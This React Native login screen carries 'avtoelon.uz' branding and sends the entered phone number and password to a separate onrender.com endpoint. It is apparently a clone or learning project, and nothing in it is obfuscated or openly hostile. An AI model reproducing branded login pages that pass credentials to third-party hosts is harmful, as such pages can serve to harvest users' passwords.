import React, { useState } from 'react';
import { View, Text, TextInput, TouchableOpacity, StyleSheet, KeyboardAvoidingView, Alert } from 'react-native';

const PhoneInputScreen = () => {
  const [phoneNumber, setPhoneNumber] = useState('+998');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);

  const handlePhoneInputChange = (input) => {
    // Ensure the phone input always starts with "+998"
    if (!input.startsWith('+998')) {
      setPhoneNumber('+998');
    } else {
      setPhoneNumber(input);
    }
  };

  const handleContinue = async () => {
    if (!password) {
      Alert.alert('Ошибка', 'Пожалуйста, введите пароль');
      return;
    }

    setLoading(true);
    try {
      const response = await fetch('https://avto-elon-node.onrender.com/api/users', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ phone: phoneNumber, password }),
      });

      const data = await response.json();

      if (response.ok) {
        Alert.alert('Успех', `Пользователь найден! Номер ${phoneNumber} привязан.`);
        console.log('API Response:', data);
      } else {
        Alert.alert('Ошибка', data.message || 'Неверный телефон или пароль');
        console.error('API Error:', data);
      }
    } catch (error) {
      Alert.alert('Ошибка', 'Произошла ошибка при отправке данных');
      console.error('Request Error:', error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <KeyboardAvoidingView style={styles.container} behavior="padding">
      <Text style={styles.title}>Личный кабинет</Text>
      <Text style={styles.subtitle}>avtoelon.uz</Text>

      {/* Phone Number Input */}
      <TextInput
        style={styles.input}
        value={phoneNumber}
        onChangeText={handlePhoneInputChange}
        placeholder="+998"
        keyboardType="numeric"
        maxLength={13}
        placeholderTextColor="#A0A0A0"
      />

      {/* Password Input */}
      <TextInput
        style={styles.input}
        value={password}
        onChangeText={setPassword}
        placeholder="Введите пароль"
        secureTextEntry={true}
        placeholderTextColor="#A0A0A0"
      />

      <TouchableOpacity
        style={[
          styles.button,
          phoneNumber.length >= 9 && password.length > 0
            ? styles.buttonActive
            : styles.buttonDisabled,
        ]}
        onPress={handleContinue}
        disabled={phoneNumber.length < 9 || password.length === 0 || loading}
      >
        <Text style={styles.buttonText}>{loading ? 'Загрузка...' : 'Продолжить'}</Text>
      </TouchableOpacity>

      <Text style={styles.agreementText}>
        Продолжая авторизацию, вы соглашаетесь с{' '}
        <Text style={styles.link}>этими правилами</Text>
      </Text>
    </KeyboardAvoidingView>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    paddingHorizontal: 20,
    backgroundColor: '#FFF',
  },
  title: {
    fontSize: 18,
    fontWeight: 'bold',
    color: '#000',
    marginBottom: 10,
  },
  subtitle: {
    fontSize: 22,
    fontWeight: 'bold',
    color: '#007AFF',
    marginBottom: 30,
  },
  input: {
    width: '100%',
    height: 50,
    borderColor: '#E0E0E0',
    borderWidth: 1,
    borderRadius: 8,
    paddingHorizontal: 10,
    fontSize: 16,
    color: '#000',
    marginBottom: 20,
  },
  button: {
    width: '100%',
    height: 50,
    borderRadius: 8,
    justifyContent: 'center',
    alignItems: 'center',
  },
  buttonActive: {
    backgroundColor: '#007AFF',
  },
  buttonDisabled: {
    backgroundColor: '#E0E0E0',
  },
  buttonText: {
    color: '#FFF',
    fontSize: 16,
    fontWeight: 'bold',
  },
  agreementText: {
    fontSize: 12,
    color: '#A0A0A0',
    marginTop: 20,
    textAlign: 'center',
  },
  link: {
    color: '#007AFF',
    textDecorationLine: 'underline',
  },
});

export default PhoneInputScreen;
  